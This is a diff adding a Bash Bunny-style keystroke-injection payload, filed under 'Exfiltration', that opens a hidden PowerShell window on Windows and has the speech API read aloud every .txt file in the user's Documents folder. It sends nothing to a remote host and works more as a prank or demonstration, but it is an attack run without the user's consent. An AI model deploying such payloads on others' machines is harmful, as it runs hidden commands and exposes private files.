@@ -1,0 +1,22 @@
+# Title:       Read It Out
+# Description: Gets the Microsoft Speech API (SAPI) to read out the content of text files in the MyDocuments directory.
+# Author:      Cribbit
+# Version:     1.0
+# Category:    Exfiltration
+# Target:      Windows (Powershell 5.1+)
+# Attackmodes: HID
+# Extensions:  Run
+
+LED SETUP
+
+GET SWITCH_POSITION
+
+ATTACKMODE HID
+
+QUACK DELAY 500
+
+LED ATTACK
+
+RUN WIN "powershell -Noni -NoP -W h -C \"& {\$s=New-Object -ComObject SAPI.SPVoice; gci([Environment]::GetFolderPath('MyDocuments')) -file *.txt | % {\$s.Speak(\$(gc(\$_.FullName)))}}\""
+
+LED FINISH
